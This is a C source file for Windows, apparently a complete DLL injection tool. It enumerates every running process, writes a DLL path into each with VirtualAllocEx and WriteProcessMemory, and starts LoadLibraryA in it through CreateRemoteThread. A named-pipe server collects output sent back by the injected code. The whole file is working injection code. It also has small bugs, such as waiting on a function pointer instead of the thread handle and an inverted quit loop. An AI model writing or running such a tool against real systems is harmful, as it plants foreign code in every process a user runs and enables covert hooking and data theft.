#include<stdio.h>
#include<Windows.h>
#include <psapi.h>


// Func For DLL Injection
char* findDllAbsolutePath(const char* dllName);
void InjectDLL(DWORD pid, LPCSTR dll);
void injectDllForEveryProcess();
DWORD WINAPI recvData(void* arg);

// Flag For Thread
BOOL flag = TRUE;

// Var For PIPE
const wchar_t* PIPE_NAME = L"\\\\.\\pipe\\jungho";

// Var For DLL INjection
char* absolute_path = NULL;


int main(void) {

    // Change DLL Name!
    const char* dllName = "DLL1.dll";
    ////

    absolute_path = findDllAbsolutePath(dllName);
    if (GetFileAttributesA(absolute_path) == 0xffffffff) {
        printf("DLL not found.\n");
        return 1;
    }

    HANDLE recvFunc = CreateThread(0, 0, recvData, 0, 0, 0);

    injectDllForEveryProcess();

    printf("Enter \'q\' To Exit: \n");
    while (getchar() == 'q');

    flag = FALSE;
    WaitForSingleObject(recvData, INFINITE);
    CloseHandle(recvFunc);

    return 0;

}

// Func To find DLL's absolute path
char* findDllAbsolutePath(const char* dllName) {

    const char* c = "\\";
    char* processPath = (char*)malloc(MAX_PATH);

    DWORD result = GetModuleFileNameA(NULL, processPath, MAX_PATH);
    if (result < 0) {
        printf("GetModuleFileNameA Error\n");
        free(processPath);
        exit(1);
    }

    char* ptr = processPath + strlen(processPath);
    while (*ptr != *c) ptr--;
    ptr++;

    memcpy(ptr, dllName, strlen(dllName));
    ptr[strlen(dllName)] = NULL;

    return processPath;
}
////

// Func to Recv PIPE data
DWORD WINAPI recvData(void* arg) {
    HANDLE hPipe;
    char buffer[128];
    DWORD bytesRead;

    hPipe = CreateNamedPipe(PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 128, 128, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("CreateNamedPipe failed with error: %d\n", GetLastError());
        return 1;
    }

    BOOL connected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
    if (!connected) {
        printf("ConnectNamedPipe failed with error: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    while (flag) {
        BOOL result = ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
        if (result) {
            buffer[bytesRead] = '\0';
            printf("%s\n", buffer);
        }
        else {
            printf("ReadFile failed with error: %d\n", GetLastError());
        }
    }

    return 0;
}
////

// Func For DLL Injection
void InjectDLL(DWORD pid, LPCSTR dll) {

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (NULL == hProcess) {
        // There's no process
        return;
    }

    LPVOID lpAddr = VirtualAllocEx(hProcess, NULL, strlen(dll) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (lpAddr) {
        WriteProcessMemory(hProcess, lpAddr, dll, strlen(dll) + 1, NULL);
    }
    else {
        printf("VirtualAllocEx() failure.\n");
        return;
    }

    LPTHREAD_START_ROUTINE pfnLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pfnLoadLibraryA) {
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnLoadLibraryA, lpAddr, 0, NULL);
        DWORD dwExitCode = NULL;
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }
    VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
}
////

// Func For Inject DLL into ever process
void injectDllForEveryProcess() {


    DWORD processIds[1024], processCount, needed;
    if (!EnumProcesses(processIds, sizeof(processIds), &needed)) {
        printf("EnumProcesses failed with error %lu\n", GetLastError());
        return;
    }

    processCount = needed / sizeof(DWORD);

    DWORD pid = GetCurrentProcessId();
    for (DWORD i = 0; i < processCount; i++) {
        if (processIds[i] != 0) {

            if (processIds[i] == pid) continue;
            InjectDLL(processIds[i], absolute_path);
        }
    }
}
////
